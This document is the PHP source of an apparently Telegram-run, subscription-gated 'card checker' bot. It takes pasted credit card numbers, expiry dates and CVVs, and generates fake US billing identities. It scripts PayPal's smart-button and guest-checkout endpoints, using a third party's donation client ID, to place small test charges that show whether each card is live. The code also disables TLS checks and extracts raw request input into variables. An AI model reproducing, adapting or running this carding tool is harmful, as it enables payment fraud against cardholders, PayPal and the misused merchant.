<?php


$ownerData = file_get_contents('database/owner.txt');
if (strpos($ownerData, "$userId") !== false) {
		$rank = "OWNER"; 
} else {
		$paidData = file_get_contents('database/paid.txt');
		$pattern = "/User ID: $userId\nRank: (.+)\n/";
		if (preg_match($pattern, $paidData, $matches)) {
				$rank = $matches[1];
		} else {
				$rank = "FREE";
		}
}



if((strpos($text, '/ppl') === 0) or (strpos($text, '.ppl') === 0) or ((strpos($text, '$ppl') === 0) or (strpos($text, '!ppl') === 0)) or ((strpos($text, '+ppl') === 0) or (strpos($text, '#ppl') === 0)) or (strpos($text, '?ppl') === 0)) {


$userData = file_get_contents('database/users.txt');
if (strpos($userData, $userId) === false) {
bot('sendMessage', [
		'chat_id' => $chat_id,
		'message_id' => $message_id,
		'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>Unregistered User! ⚠️</code>
[↯]Message: <code>You have to register first to use me</code>
You have to use <code>/register</code> to use me 
- - - - - - - - - - - - - - - - - - - - - -
</b>",
		'reply_to_message_id' => $message_id,
		'parse_mode' => 'html'
]);
return;
}


if (strlen($message) <= 4) {
						bot('sendMessage', [
				'chat_id' => $chat_id,
				'message_id' => $message_id,
				'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - - 
[WRONG FORMAT] ⚠️
- - - - - - - - - - - - - - - - - - - - - -
Ex: <code>/chk cc|mm|yy|cvv</code>     
Gateway <code>Paypal 0.5 $ Charge</code>        
- - - - - - - - - - - - - - - - - - - - - -
</b>",
				'reply_to_message_id' => $message_id,
				'parse_mode' => 'html'
		]);
return;
}  

$paid = file_get_contents('database/paid.txt');
if (preg_match('/User ID:\s*(\d+)/', $paid, $matches)) {
$paids = $matches[1];
}

$owner = file_get_contents('database/owner.txt');
$owners = explode("\n", $owner);

$authgrp = file_get_contents('database/authgrp.txt');
$authgrps = explode("\n", $authgrp);

if (strpos($paid, "User ID: $userId") === false) {
			bot('sendMessage', [
					'chat_id' => $chat_id,
					'message_id' => $message_id,
					'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>User is broke!</code>
[↯]Message: <code>Ever feel like your wallet's on a diet? Upgrade to my services and let's fatten it up together!</code> 
- - - - - - - - - - - - - - - - - - - - - -
</b>",
				'reply_to_message_id' => $message_id,
				'parse_mode' => 'html'
			]);
			return;
}


$spamResult = isSpamming($userId);
if ($spamResult !== false) {
bot('sendMessage', [
		'chat_id' => $chat_id,
		'message_id' => $message_id,
		'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ANTISPAM DETECTED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯] Try again after $spamResult seconds !
- - - - - - - - - - - - - - - - - - - - - -
</b>",
		'reply_to_message_id' => $message_id,
		'parse_mode' => 'html'
]);
return;
}  


//=========MAIN CODE===========//
$start_time = microtime(true);

$messageidtoedit50 = bot('sendmessage',[
					'chat_id'=>$chat_id,
					'text'=>"<b>Started checking...</b>",
					'parse_mode'=>'html',
					'reply_to_message_id'=> $message_id,

				]);

				$messageidtopfw = capture(json_encode($messageidtoedit50), '"message_id":', ',');

	if ($_SERVER['REQUEST_METHOD'] == "POST") {
		extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
		extract($_GET);
}


$lista = substr($message, 5);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0, 1);
$exploded = multiexplode(array(":", "/", " ", "|", ""), $lista);
$cc = $exploded[0];
$mes = $exploded[1];
$ano = $exploded[2];
$cvv = $exploded[3];

if (empty($cc) || empty($mes) || empty($ano) || empty($cvv)) {
		bot('editMessageText', [
				'chat_id' => $chat_id,
				'message_id' => $messageidtopfw,
				'text' => "!𝙔𝙤𝙪 𝘿𝙪𝙢𝙗𝙤 𝘼𝙨𝙨 𝙃𝙤𝙡𝙚!\n𝙏𝙚𝙭𝙩 𝙎𝙝𝙤𝙪𝙡𝙙 𝙊𝙣𝙡𝙮 𝘾𝙤𝙣𝙩𝙖𝙞𝙣 - <code>/chkcc|mm|yy|cvv</code>-",
				'parse_mode' => 'html',
				'reply_to_message_id' => $messageidtopfw,
				'disable_web_page_preview' => true
		]);
		return;
}

$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$lista = (''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');


$last4 = substr($cc, -4);

//=========BANNED BIN=============//
$bin = substr($cc, 0, 6);
$bannedBins = file("banned.txt", FILE_IGNORE_NEW_LINES);

if (in_array($bin, $bannedBins)) {
bot('editMessageText',[
						'chat_id'=>$chat_id,
						'message_id'=>$messageidtopfw,
						'text'=>"<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]BIN BANNED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯]CC: <code>$lista</code>
[↯]Reason: <code>All Prepaid banned!</code>
 - - - - - - - - - - - - - - - - - - - - - -
</b>",
						'parse_mode'=>'html',

				]);
return;
}

//---------------------//
bot('editMessageText',[
						'chat_id'=>$chat_id,
						'message_id'=>$messageidtopfw,
						'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Paypal 0.5 $ Charge
Status: <code>■□□□□ 20%[🟥]</code>
Req: <code>@$username</code>
</b>",
						'parse_mode'=>'html',

				]);

function Getstr($string, $start, $end) {
		$str = explode($start, $string);
		$str = explode($end, $str[1]);
		return $str[0];
}

 $fim = json_decode(file_get_contents('https://bins.antipublic.cc/bins/'.$bin), true);
 $bin1 = $fim["bin"] ?? null;

		 if ($bin1 !== null) {
				 $brand = $fim["brand"];
				 $country = $fim["country"];
				 $country_name = $fim["country_name"];
				 $country_flag = $fim["country_flag"];

				 $country_currencies = $fim["country_currencies"];
				 $bank = $fim["bank"];
				 $level = $fim["level"];
				 $type = $fim["type"];
		 }


		$proxie = null;
		$pass = null;
		$cookieFile = getcwd() . '/cookies.txt';

		function Capture2($str, $starting_word, $ending_word)
		{
				$subtring_start  = strpos($str, $starting_word);
				$subtring_start += strlen($starting_word);
				$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;
				return substr($str, $subtring_start, $size);
		}


//==============[Randomizing Details-END]======================//

bot('editMessageText',[
						'chat_id'=>$chat_id,
						'message_id'=>$messageidtopfw,
						'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Paypal 0.5 $ Charge
Status: <code>□■□□□ 40%[🟦]</code>
Req: <code>@$username</code>
</b>",
						'parse_mode'=>'html',

				]);

//==================[BIN LOOK-UP]======================//
$firstname = ucfirst(str_shuffle('Jeaorge'));
$lastname = ucfirst(str_shuffle('washington'));
$street = "" . rand(0000, 9999) . "Street 1";
$ph = array("682", "346", "246");
$ph1 = array_rand($ph);
$phh = $ph[$ph1];
$phone = "$phh" . rand(0000000, 9999999) . "";
$email = 'anthoyn' . $firstname . 'us82j37' . $phone . '@gmail.com';
$st = array("AL", "NY", "CA", "FL", "WA");
$st1 = array_rand($st);
$statee = $st[$st1];
if ($statee == "NY") {
		$state = $statee;
		$postcode = "10080";
		$city = "New York";
} elseif ($statee == "WA") {
		$state = $statee;
		$postcode = "98001";
		$city = "Auburn";
} elseif ($statee == "AL") {
		$state = $statee;
		$postcode = "35005";
		$city = "Adamsville";
} elseif ($statee == "FL") {
		$state = $statee;
		$postcode = "32003";
		$city = "Orange Park";
} else {
		$state = $statee;
		$postcode = "90201";
		$city = "Bell";
};


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/smart/buttons?locale.lang=en&locale.country=US&style.label=&style.layout=vertical&style.color=gold&style.shape=&style.tagline=false&style.height=40&style.menuPlacement=below&sdkVersion=5.0.344&components.0=buttons&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFNekk4d0VQOURIcFBHOXd0UWRrSWsxdkxwMEJ4S2dtM0RNMi05Vm5KaGhvamFJTVlsNXB1OU5JUjkydWY1blVBYzdoSTI5a1E3akV3SF8mY3VycmVuY3k9TVhOJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX21lcXZmdmR0cGh6YmR6ZmlzZXd5d2ZycWNjeXB6cyJ9fQ&clientID=AaMzI8wEP9DHpPG9wtQdkIk1vLp0BxKgm3DM2-9VnJhhojaIMYl5pu9NIR92uf5nUAc7hI29kQ7jEwH_&sdkCorrelationID=0aab5698a8427&storageID=uid_250b1d7213_mti6ndq6ntc&sessionID=uid_dbc1e53ffd_mti6ndq6ntc&buttonSessionID=uid_1c583f9aa0_mti6ndc6ntk&env=production&buttonSize=large&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwiemltcGxlciI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtYXhpbWEiOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=desktop&experiment.enableVenmo=false&experiment.enableVenmoAppLabel=false&flow=purchase&currency=MXN&intent=capture&commit=true&vault=false&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&experience=&allowBillingPayments=true');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		'referer: https://onehealthworkforceacademies.org/',
		'sec-fetch-dest: iframe',
		'sec-fetch-mode: navigate',
		'sec-fetch-site: cross-site',
		'upgrade-insecure-requests: 1',
		'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'locale.lang=en&locale.country=US&style.label=&style.layout=vertical&style.color=gold&style.shape=&style.tagline=false&style.height=40&style.menuPlacement=below&sdkVersion=5.0.344&components.0=buttons&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFNekk4d0VQOURIcFBHOXd0UWRrSWsxdkxwMEJ4S2dtM0RNMi05Vm5KaGhvamFJTVlsNXB1OU5JUjkydWY1blVBYzdoSTI5a1E3akV3SF8mY3VycmVuY3k9TVhOJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX21lcXZmdmR0cGh6YmR6ZmlzZXd5d2ZycWNjeXB6cyJ9fQ&clientID=AaMzI8wEP9DHpPG9wtQdkIk1vLp0BxKgm3DM2-9VnJhhojaIMYl5pu9NIR92uf5nUAc7hI29kQ7jEwH_&sdkCorrelationID=0aab5698a8427&storageID=uid_250b1d7213_mti6ndq6ntc&sessionID=uid_dbc1e53ffd_mti6ndq6ntc&buttonSessionID=uid_1c583f9aa0_mti6ndc6ntk&env=production&buttonSize=large&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwiemltcGxlciI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtYXhpbWEiOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=desktop&experiment.enableVenmo=false&experiment.enableVenmoAppLabel=false&flow=purchase&currency=MXN&intent=capture&commit=true&vault=false&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&experience=&allowBillingPayments=true');
$r1 = curl_exec($ch);
curl_close($ch);
$bearer = getstr($r1, 'facilitatorAccessToken":"', '"');


//=======================[5 REQ]==================================//




bot('editMessageText',[
						'chat_id'=>$chat_id,
						'message_id'=>$messageidtopfw,
						'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Paypal 0.5 $ Charge
Status: <code>□□■□□ 60%[🟨]</code>
Req: <code>@$username</code>
</b>",
						'parse_mode'=>'html',

				]);
//=======================[5 REQ]==================================//

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/v2/checkout/orders');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		'authority: www.paypal.com',
		'method: POST',
		'path: /v2/checkout/orders',
		'scheme: https',
		'accept: application/json',
		'accept-language: es-ES,es;q=0.9',
		'authorization: Bearer ' . $bearer . '',
		'content-type: application/json',
		'origin: https://www.paypal.com',
		'paypal-partner-attribution-id',
		'prefer: return=representation',
		'referer: https://www.paypal.com/smart/buttons?locale.lang=en&locale.country=US&style.label=&style.layout=vertical&style.color=gold&style.shape=&style.tagline=false&style.height=40&style.menuPlacement=below&sdkVersion=5.0.344&components.0=buttons&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFNekk4d0VQOURIcFBHOXd0UWRrSWsxdkxwMEJ4S2dtM0RNMi05Vm5KaGhvamFJTVlsNXB1OU5JUjkydWY1blVBYzdoSTI5a1E3akV3SF8mY3VycmVuY3k9TVhOJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX21lcXZmdmR0cGh6YmR6ZmlzZXd5d2ZycWNjeXB6cyJ9fQ&clientID=AaMzI8wEP9DHpPG9wtQdkIk1vLp0BxKgm3DM2-9VnJhhojaIMYl5pu9NIR92uf5nUAc7hI29kQ7jEwH_&sdkCorrelationID=0aab5698a8427&storageID=uid_250b1d7213_mti6ndq6ntc&sessionID=uid_dbc1e53ffd_mti6ndq6ntc&buttonSessionID=uid_1c583f9aa0_mti6ndc6ntk&env=production&buttonSize=large&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwiemltcGxlciI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtYXhpbWEiOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=desktop&experiment.enableVenmo=false&experiment.enableVenmoAppLabel=false&flow=purchase&currency=MXN&intent=capture&commit=true&vault=false&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&experience=&allowBillingPayments=true',
		'sec-fetch-dest: empty',
		'sec-fetch-mode: cors',
		'sec-fetch-site: same-origin',
		'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"purchase_units":[{"amount":{"currency_code":"MXN","value":"1"},"description":"Donativo único","custom_id":"Referencia: Donativo único. Acerca del donativo: ","item_list":{"items":[{"name":"FDUM","description":"FDUM description"}]}}],"intent":"CAPTURE","application_context":{}}');

$r2 = curl_exec($ch);
curl_close($ch);
$orden = getstr($r2, 'id":"', '"');


bot('editMessageText',[
						'chat_id'=>$chat_id,
						'message_id'=>$messageidtopfw,
						'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Paypal 0.5 $ Charge
Status: <code>□□□■□ 80%[🟧]</code>
Req: <code>@$username</code>
</b>",
						'parse_mode'=>'html',

				]);

//-------------------Req 2--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?fetch_credit_form_submit');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		'authority: www.paypal.com',
		'method: POST',
		'path: /graphql?fetch_credit_form_submit',
		'scheme: https',
		'accept: */*',
		'accept-language: es-ES,es;q=0.9',
		'content-type: application/json',
		'origin: https://www.paypal.com',
		'paypal-client-context: ' . $orden . '',
		'paypal-client-metadata-id: ' . $orden . '',
		'referer: https://www.paypal.com/smart/card-fields?sessionID=uid_58937796db_mtm6nte6ntm&buttonSessionID=uid_93ad78f223_mtm6nte6ntm&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFNekk4d0VQOURIcFBHOXd0UWRrSWsxdkxwMEJ4S2dtM0RNMi05Vm5KaGhvamFJTVlsNXB1OU5JUjkydWY1blVBYzdoSTI5a1E3akV3SF8mY3VycmVuY3k9TVhOJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX21lcXZmdmR0cGh6YmR6ZmlzZXd5d2ZycWNjeXB6cyJ9fQ&disable-card=&token=' . $orden . '',
		'sec-fetch-dest: empty',
		'sec-fetch-mode: cors',
		'sec-fetch-site: same-origin',
		'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
		'x-app-name: standardcardfields',
		'x-country: US',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ","variables":{"token":"' . $orden . '","card":{"cardNumber":"' . $cc . '","expirationDate":"' . $mes . '/' . $ano . '","postalCode":"' . $postcode . '","securityCode":"' . $cvv . '"},"phoneNumber":"' . $phone . '","firstName":"' . $firstname . ' ","lastName":"' . $lastname . '","billingAddress":{"givenName":"' . $firstname . ' ","familyName":"' . $lastname . '","line1":"' . $street . '","line2":null,"city":"' . $city . '","state":"' . $state . '","postalCode":"' . $postcode . '","country":"US"},"shippingAddress":{"givenName":"' . $firstname . ' ","familyName":"' . $lastname . '","line1":"' . $street . '","line2":null,"city":"' . $city . '","state":"' . $state . '","postalCode":"' . $postcode . '","country":"US"},"email":"' . $email . '","currencyConversionType":"VENDOR"},"operationName":null}');

